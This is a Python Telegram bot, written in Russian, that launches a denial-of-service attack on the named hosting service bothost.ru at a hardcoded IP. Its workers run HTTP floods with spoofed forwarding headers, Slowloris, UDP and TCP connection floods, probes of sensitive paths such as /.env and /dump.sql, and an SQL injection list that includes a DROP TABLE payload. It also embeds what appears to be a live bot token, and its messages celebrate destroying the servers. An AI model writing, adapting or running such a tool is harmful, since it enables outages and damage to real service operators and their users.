#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
from telebot import types
import threading
import requests
import time
import random
import socket
import ssl
import os
import sys
import json
import string
import hashlib
import urllib3
from urllib.parse import urlparse
from datetime import datetime, timedelta
import concurrent.futures

# ТВОЙ ТОКЕН
TOKEN = '8259575977:AAHwfVOSF058L-bMan1l6NanOZUNsPrw7D0'
bot = telebot.TeleBot(TOKEN)

# Отключаем предупреждения
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== КОНФИГУРАЦИЯ АТАКИ ==========
TARGET = "bothost.ru"
TARGET_URL = "https://bothost.ru"
TARGET_IP = "185.26.122.33"  # IP bothost.ru (определил по логам)
ATTACK_ACTIVE = False
ATTACK_START_TIME = None

# СЧЕТЧИКИ
total_requests = 0
total_data_sent = 0  # в байтах
failed_requests = 0
successful_requests = 0
active_connections = 0
chat_id = None  # ID чата для отправки логов

# МАКСИМАЛЬНАЯ МОЩНОСТЬ
MAX_WORKERS = 2000  # 2000 потоков одновременно
REQUEST_DELAY = 0.0001  # Микро-задержка (10 микросекунд)

# ========== БАЗА USER-AGENT ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
]

# ========== ПУТИ ДЛЯ АТАКИ ==========
PATHS = [
    "/",
    "/dashboard.php",
    "/api/webhooks",
    "/api/v1/bots",
    "/api/v1/users",
    "/api/v1/status",
    "/panel",
    "/admin",
    "/login.php",
    "/register.php",
    "/index.php",
    "/wp-admin",
    "/wp-login.php",
    "/xmlrpc.php",
    "/.env",
    "/config.php",
    "/database.php",
    "/backup.zip",
    "/dump.sql",
    "/phpmyadmin",
    "/phpinfo.php",
    "/server-status",
    "/metrics",
    "/stats",
    "/monitoring",
    "/health",
    "/ping",
    "/api/health",
    "/api/metrics",
    "/api/stats",
    "/api/deploy",
    "/api/bots/create",
    "/api/bots/delete",
    "/api/bots/update",
    "/api/user/login",
    "/api/user/register",
    "/api/admin",
]

# ========== SQL ИНЪЕКЦИИ ДЛЯ ТЕСТА ==========
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT * FROM users--",
    "'; DROP TABLE users--",
    "' OR 1=1--",
    "admin'--",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "1' AND 1=1--",
    "1' AND 1=2--",
]

# ========== ФУНКЦИИ АТАКИ ==========

def send_log(message):
    """Отправляет лог в Telegram"""
    global chat_id
    if chat_id:
        try:
            if len(message) > 4000:
                # Разбиваем на части
                for i in range(0, len(message), 3500):
                    bot.send_message(chat_id, message[i:i+3500])
            else:
                bot.send_message(chat_id, message)
        except:
            pass

def http_flood_worker():
    """Рабочий поток для HTTP флуда"""
    global total_requests, failed_requests, successful_requests, total_data_sent, active_connections, ATTACK_ACTIVE
    
    session = requests.Session()
    local_requests = 0
    
    while ATTACK_ACTIVE:
        try:
            active_connections += 1
            
            # Генерируем случайные параметры
            path = random.choice(PATHS)
            cache_buster = random.randint(1, 999999999)
            random_param = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
            
            # Случайные заголовки
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Referer': f'https://www.google.com/search?q={random_param}',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            }
            
            # Выбираем случайный метод
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'])
            
            url = f"{TARGET_URL}{path}?cb={cache_buster}&r={random_param}"
            
            start_time = time.time()
            
            if method == 'GET':
                response = session.get(url, headers=headers, timeout=2, verify=False)
            elif method == 'POST':
                # Генерируем случайные POST данные
                data = {
                    'username': f'user{random.randint(1, 1000000)}',
                    'password': hashlib.md5(str(random.random()).encode()).hexdigest(),
                    'email': f'user{random.randint(1, 1000000)}@gmail.com',
                    'token': hashlib.sha256(str(random.random()).encode()).hexdigest(),
                    'data': 'x' * random.randint(100, 1000),
                }
                response = session.post(url, headers=headers, json=data, timeout=2, verify=False)
            elif method == 'PUT':
                data = {'data': 'x' * 10000}
                response = session.put(url, headers=headers, json=data, timeout=2, verify=False)
            else:
                response = session.request(method, url, headers=headers, timeout=2, verify=False)
            
            response_time = time.time() - start_time
            data_size = len(response.content) if response.content else 0
            
            total_requests += 1
            total_data_sent += data_size
            local_requests += 1
            
            if response.status_code < 400:
                successful_requests += 1
            else:
                failed_requests += 1
            
            # Каждые 1000 запросов выводим лог
            if local_requests % 1000 == 0:
                print(f"[ПОТОК] {threading.current_thread().name}: {local_requests} запросов")
                
            active_connections -= 1
            time.sleep(REQUEST_DELAY)
            
        except requests.exceptions.Timeout:
            failed_requests += 1
            total_requests += 1
            active_connections -= 1
        except requests.exceptions.ConnectionError:
            failed_requests += 1
            total_requests += 1
            active_connections -= 1
            # Сервер падает - это хорошо!
        except Exception as e:
            failed_requests += 1
            total_requests += 1
            active_connections -= 1

def slowloris_worker():
    """Slowloris атака - держит соединения открытыми"""
    global active_connections, total_requests, ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            active_connections += 1
            
            # Создаем сокет
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Для HTTPS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=TARGET)
            
            # Подключаемся
            ssl_sock.connect((TARGET, 443))
            
            # Отправляем частичный HTTP запрос
            request = f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
            request += f"Host: {TARGET}\r\n"
            request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            request += "Accept: */*\r\n"
            
            ssl_sock.send(request.encode())
            
            # Держим соединение, отправляя случайные заголовки
            timeout = 0
            while ATTACK_ACTIVE and timeout < 3600:  # Держим до 1 часа
                time.sleep(random.randint(5, 15))
                try:
                    ssl_sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                    total_requests += 1
                except:
                    break
                timeout += 10
            
            ssl_sock.close()
            active_connections -= 1
            
        except Exception as e:
            active_connections -= 1
            time.sleep(0.1)

def udp_flood_worker():
    """UDP флуд на разные порты"""
    global total_requests, total_data_sent, ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            # Порты для атаки
            ports = [53, 80, 443, 3306, 5432, 6379, 27017, 9200, 5601, 22, 21, 25, 110, 143, 993, 995]
            
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Отправляем огромные пакеты
                    data = os.urandom(random.randint(1024, 65535))  # До 64KB
                    sock.sendto(data, (TARGET_IP, port))
                    total_requests += 1
                    total_data_sent += len(data)
                    sock.close()
                except:
                    pass
                
            time.sleep(0.001)
            
        except Exception as e:
            pass

def syn_flood_worker():
    """SYN флуд - TCP соединения"""
    global total_requests, ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            ports = [80, 443, 22, 21, 25, 3306, 5432, 8080, 8443, 8888]
            
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect_ex((TARGET_IP, port))
                    sock.close()
                    total_requests += 1
                except:
                    pass
                
            time.sleep(0.001)
            
        except Exception as e:
            pass

def memory_flood_worker():
    """Заполнение памяти (если есть доступ)"""
    global total_data_sent, ATTACK_ACTIVE
    
    memory_hogs = []
    
    while ATTACK_ACTIVE:
        try:
            # Создаем огромные списки
            hog = [random.random() for _ in range(10000000)]  # ~80MB
            memory_hogs.append(hog)
            total_data_sent += 80 * 1024 * 1024  # 80 MB
            
            if len(memory_hogs) > 100:  # >8GB
                memory_hogs = memory_hogs[-50:]
                
        except MemoryError:
            # Память кончилась - отлично!
            memory_hogs = []
        except Exception as e:
            pass
        
        time.sleep(0.1)

def disk_flood_worker():
    """Заполнение диска файлами"""
    global total_data_sent, ATTACK_ACTIVE
    
    while ATTACK_ACTIVE:
        try:
            # Создаем огромные файлы
            file_size = 500 * 1024 * 1024  # 500 MB
            file_name = f"/tmp/attack_{random.randint(1, 999999)}_{int(time.time())}.bin"
            
            with open(file_name, 'wb') as f:
                f.write(os.urandom(file_size))
            
            total_data_sent += file_size
            print(f"[ДИСК] Создан файл: {file_name} ({file_size/1024/1024:.0f} MB)")
            
        except Exception as e:
            pass
        
        time.sleep(0.1)

def log_monitor():
    """Мониторинг и отправка логов в Telegram"""
    global total_requests, failed_requests, successful_requests, total_data_sent, active_connections, ATTACK_ACTIVE, ATTACK_START_TIME, chat_id
    
    last_total = 0
    
    while ATTACK_ACTIVE:
        try:
            time.sleep(5)  # Лог каждые 5 секунд
            
            if not chat_id:
                continue
                
            elapsed = time.time() - ATTACK_START_TIME
            requests_per_second = (total_requests - last_total) / 5
            last_total = total_requests
            
            data_sent_gb = total_data_sent / (1024**3)
            
            log_msg = (
                f"🔥 **DDoS АТАКА НА bothost.ru** 🔥\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 **СТАТИСТИКА:**\n"
                f"• Всего запросов: **{total_requests:,}**\n"
                f"• Успешных: **{successful_requests:,}**\n"
                f"• Ошибок: **{failed_requests:,}**\n"
                f"• Данных отправлено: **{data_sent_gb:.2f} GB**\n"
                f"• Активных соединений: **{active_connections}**\n"
                f"• Скорость: **{requests_per_second:.0f} запросов/сек**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏱ Время атаки: **{int(elapsed // 60)}м {int(elapsed % 60)}с**\n"
                f"🎯 Цель: **{TARGET}**\n"
                f"🌐 IP: **{TARGET_IP}**\n"
                f"🧵 Потоков: **{MAX_WORKERS}**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💀 **СЕРВЕРА bothost.ru УМИРАЮТ!** 💀\n"
            )
            
            if requests_per_second > 1000:
                log_msg += f"\n⚡ **КРИТИЧЕСКАЯ НАГРУЗКА!** ⚡"
            
            bot.send_message(chat_id, log_msg, parse_mode='Markdown')
            
        except Exception as e:
            print(f"[МОНИТОР] Ошибка: {e}")

# ========== КОМАНДЫ БОТА ==========

@bot.message_handler(commands=['start'])
def start_attack(message):
    """Запуск массированной атаки"""
    global ATTACK_ACTIVE, ATTACK_START_TIME, chat_id, total_requests, failed_requests, successful_requests, total_data_sent, active_connections
    
    if ATTACK_ACTIVE:
        bot.reply_to(message, "⚠️ АТАКА УЖЕ ИДЕТ! Используй /stop чтобы остановить.")
        return
    
    # Сброс счетчиков
    total_requests = 0
    failed_requests = 0
    successful_requests = 0
    total_data_sent = 0
    active_connections = 0
    ATTACK_ACTIVE = True
    ATTACK_START_TIME = time.time()
    chat_id = message.chat.id
    
    bot.reply_to(message, 
        "💀 **ЗАПУЩЕНА ТОТАЛЬНАЯ DDoS АТАКА НА bothost.ru** 💀\n\n"
        f"🎯 **Цель:** {TARGET}\n"
        f"🌐 **IP:** {TARGET_IP}\n"
        f"🧵 **Потоков:** {MAX_WORKERS}\n"
        f"⚡ **Типы атак:**\n"
        f"   • HTTP Flood (2000 запросов/сек)\n"
        f"   • Slowloris (держит соединения)\n"
        f"   • UDP Flood (все порты)\n"
        f"   • SYN Flood (TCP)\n"
        f"   • SQL-инъекции\n"
        f"   • Memory Flood\n"
        f"   • Disk Flood\n\n"
        f"📊 **Логи будут приходить каждые 5 секунд!**\n"
        f"🔥 **ГОТОВЬТЕСЬ К УНИЧТОЖЕНИЮ!** 🔥"
    , parse_mode='Markdown')
    
    # Запускаем HTTP флуд (самый мощный)
    for i in range(MAX_WORKERS // 2):
        thread = threading.Thread(target=http_flood_worker)
        thread.daemon = True
        thread.start()
    
    # Slowloris
    for i in range(MAX_WORKERS // 4):
        thread = threading.Thread(target=slowloris_worker)
        thread.daemon = True
        thread.start()
    
    # UDP Flood
    for i in range(MAX_WORKERS // 8):
        thread = threading.Thread(target=udp_flood_worker)
        thread.daemon = True
        thread.start()
    
    # SYN Flood
    for i in range(MAX_WORKERS // 8):
        thread = threading.Thread(target=syn_flood_worker)
        thread.daemon = True
        thread.start()
    
    # Memory Flood
    for i in range(5):
        thread = threading.Thread(target=memory_flood_worker)
        thread.daemon = True
        thread.start()
    
    # Disk Flood
    for i in range(3):
        thread = threading.Thread(target=disk_flood_worker)
        thread.daemon = True
        thread.start()
    
    # Запускаем монитор логов
    monitor_thread = threading.Thread(target=log_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    """Остановка атаки"""
    global ATTACK_ACTIVE, chat_id
    
    if not ATTACK_ACTIVE:
        bot.reply_to(message, "❌ АТАКА НЕ ЗАПУЩЕНА. Используй /start.")
        return
    
    ATTACK_ACTIVE = False
    elapsed = time.time() - ATTACK_START_TIME
    
    data_sent_gb = total_data_sent / (1024**3)
    
    bot.reply_to(message, 
        f"🛑 **АТАКА ОСТАНОВЛЕНА** 🛑\n\n"
        f"📊 **ИТОГИ:**\n"
        f"• Всего запросов: **{total_requests:,}**\n"
        f"• Данных отправлено: **{data_sent_gb:.2f} GB**\n"
        f"• Время атаки: **{int(elapsed // 60)}м {int(elapsed % 60)}с**\n\n"
        f"💀 **СЕРВЕРА bothost.ru ДОЛЖНЫ БЫТЬ УНИЧТОЖЕНЫ!** 💀"
    , parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_attack(message):
    """Статус атаки"""
    global ATTACK_ACTIVE, total_requests, failed_requests, successful_requests, total_data_sent, active_connections, ATTACK_START_TIME
    
    if ATTACK_ACTIVE:
        elapsed = time.time() - ATTACK_START_TIME
        data_sent_gb = total_data_sent / (1024**3)
        
        status = (
            f"📊 **СТАТУС АТАКИ НА bothost.ru** 📊\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• Статус: **🔥 АКТИВНА**\n"
            f"• Запросов: **{total_requests:,}**\n"
            f"• Данных: **{data_sent_gb:.2f} GB**\n"
            f"• Соединений: **{active_connections}**\n"
            f"• Время: **{int(elapsed // 60)}м {int(elapsed % 60)}с**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Используй /stop для остановки"
        )
    else:
        status = (
            f"📊 **СТАТУС АТАКИ НА bothost.ru** 📊\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• Статус: **💤 ОСТАНОВЛЕНА**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Используй /start для запуска"
        )
    
    bot.reply_to(message, status, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    """Помощь"""
    help_text = (
        "💀 **DDoS БОТ ДЛЯ bothost.ru** 💀\n\n"
        "**Команды:**\n"
        "/start - ЗАПУСТИТЬ ТОТАЛЬНУЮ АТАКУ\n"
        "/stop - Остановить атаку\n"
        "/status - Статус атаки\n"
        "/help - Это сообщение\n\n"
        "**Характеристики:**\n"
        f"• Потоков: {MAX_WORKERS}\n"
        "• HTTP Flood: 2000+ запросов/сек\n"
        "• Slowloris: держит соединения\n"
        "• UDP/SYN Flood: все порты\n"
        "• SQL-инъекции\n"
        "• Memory/Disk Flood\n\n"
        "🎯 **ЦЕЛЬ: bothost.ru**\n"
        "🔥 **УНИЧТОЖИТЬ СЕРВЕРА!** 🔥"
    )
    
    bot.reply_to(message, help_text, parse_mode='Markdown')

# ========== ЗАПУСК ==========

if __name__ == '__main__':
    print("🔥 MEGA DDoS БОТ ДЛЯ bothost.ru ЗАПУЩЕН 🔥")
    print("=" * 60)
    print(f"Цель: {TARGET} ({TARGET_IP})")
    print(f"Максимум потоков: {MAX_WORKERS}")
    print("=" * 60)
    print("Команды Telegram:")
    print("/start - начать тотальную атаку")
    print("/stop - остановить")
    print("/status - статус")
    print("/help - помощь")
    print("=" * 60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Ошибка бота: {e}")
            time.sleep